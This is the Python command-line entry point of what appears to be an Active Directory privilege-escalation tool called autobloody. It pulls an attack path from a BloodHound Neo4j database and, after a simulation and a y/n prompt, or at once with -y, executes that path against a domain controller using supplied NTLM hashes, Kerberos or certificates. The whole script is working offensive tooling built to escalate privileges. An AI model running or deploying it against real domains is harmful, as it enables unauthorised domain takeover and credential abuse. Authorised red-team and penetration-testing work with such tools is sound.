#!/usr/bin/env python3
import argparse, sys, asyncio, logging
from autobloody import automation, database, proxy_bypass


class PrefixedFormatter(logging.Formatter):
    """Custom formatter that adds prefixes based on log level"""
    
    PREFIXES = {
        logging.DEBUG: '[*]',
        logging.INFO: '[+]',
        logging.WARNING: '[!]',
        logging.ERROR: '[-]',
        logging.CRITICAL: '[-]',
    }
    
    def format(self, record):
        prefix = self.PREFIXES.get(record.levelno, '')
        if prefix:
            record.msg = f"{prefix} {record.msg}"
        return super().format(record)


def setup_logging(verbosity):
    """Configure logging based on verbosity level"""
    from bloodyAD.exceptions import LOG
    
    # Remove existing handlers
    LOG.handlers.clear()
    
    # Set level based on verbosity
    if verbosity >= 2:
        level = logging.DEBUG
    elif verbosity == 1:
        level = logging.INFO
    else:
        level = logging.WARNING
    
    LOG.setLevel(level)
    LOG.propagate = False
    # Create console handler with custom formatter
    handler = logging.StreamHandler()
    handler.setLevel(level)
    formatter = PrefixedFormatter('%(message)s')
    handler.setFormatter(formatter)
    LOG.addHandler(handler)


def main():
    parser = argparse.ArgumentParser(
        description="AD Privesc Automation",
        formatter_class=argparse.RawTextHelpFormatter,
    )

    # DB parameters
    parser.add_argument(
        "--dburi",
        default="bolt://localhost:7687",
        help='The host neo4j is running on (default is "bolt://localhost:7687")',
    )
    parser.add_argument(
        "-du",
        "--dbuser",
        default="neo4j",
        help='Neo4j username to use (default is "neo4j")',
    )
    parser.add_argument(
        "-dp", "--dbpassword", help="Neo4j password to use", required=True
    )
    parser.add_argument(
        "-ds",
        "--dbsource",
        help="Case sensitive label of the source node (name property in bloodhound)",
        required=True,
    )
    parser.add_argument(
        "-dt",
        "--dbtarget",
        help="Case sensitive label of the target node (name property in bloodhound)",
        required=True,
    )

    # Exploitation parameters
    parser.add_argument("-d", "--domain", help="Domain used for NTLM authentication (Default is dbsource domain)")
    parser.add_argument(
        "-u", "--username", help="Username used for NTLM authentication (Default is dbsource sAMAccountName)"
    )
    parser.add_argument(
        "-p",
        "--password",
        help="Cleartext password or LMHASH:NTHASH for NTLM authentication",
    )
    parser.add_argument("-k", "--kerberos", action="store_true", default=False)
    parser.add_argument(
        "-c",
        "--certificate",
        help='Certificate authentication, e.g: "path/to/key:path/to/cert"',
    )
    parser.add_argument(
        "-s",
        "--secure",
        help="Try to use LDAP over TLS aka LDAPS (default is LDAP)",
        action="store_true",
        default=False,
    )
    parser.add_argument(
        "--host",
        help="Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)",
        required=True,
    )
    parser.add_argument(
        "-y",
        "--yes",
        help="Assume yes to apply the generated privesc",
        action="store_true",
        default=False,
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Enable verbose output (-v for INFO, -vv for DEBUG)",
        action="count",
        default=0,
    )

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    
    # Setup logging based on verbosity
    setup_logging(args.verbose)

    asyncio.run(run_autobloody(args))


async def run_autobloody(args):
    path_dict = await pathgen(args)

    if not args.domain:
        args.domain = path_dict[0]["start_node"]["domain"]
    if not args.username:
        args.username = path_dict[0]["start_node"]["samaccountname"]

    automate = automation.Automation(args, path_dict)

    if args.yes:
        execute_path = "y"
    else:
        await automate.simulate()
        execute_path = input("\n\nApply this privesc?(y/n)")

    if execute_path == "y":
        await automate.exploit()
        print("\n[+] Done, attack path executed")
    else:
        print("\n[-] Attack path not executed")


async def pathgen(args):
    bypass = proxy_bypass.ProxyBypass()
    db = database.Database(args.dburi, args.dbuser, args.dbpassword)

    path = db.getPrivescPath(args.dbsource, args.dbtarget)
    path_dict = []
    for rel in path:
        start_node = {
            "name": rel.start_node["name"],
            "distinguishedname": rel.start_node["distinguishedname"],
            "objectid": rel.start_node["objectid"],
            "samaccountname": rel.start_node.get("samaccountname"),
            "domain": rel.start_node.get("domain"),
        }
        end_node = {
            "name": rel.end_node["name"],
            "distinguishedname": rel.end_node["distinguishedname"],
            "objectid": rel.end_node["objectid"],
            "samaccountname": rel.end_node.get("samaccountname"),
            "domain": rel.end_node.get("domain"),
        }
        path_dict.append({
            "start_node": start_node, "end_node": end_node, "cost": rel["cost"]
        })

    db.close()
    bypass.disable()

    print(
        f"[+] Done, {len(path_dict)} edges have been found between {args.dbsource} and"
        f" {args.dbtarget}"
    )
    return path_dict


if __name__ == "__main__":
    main()
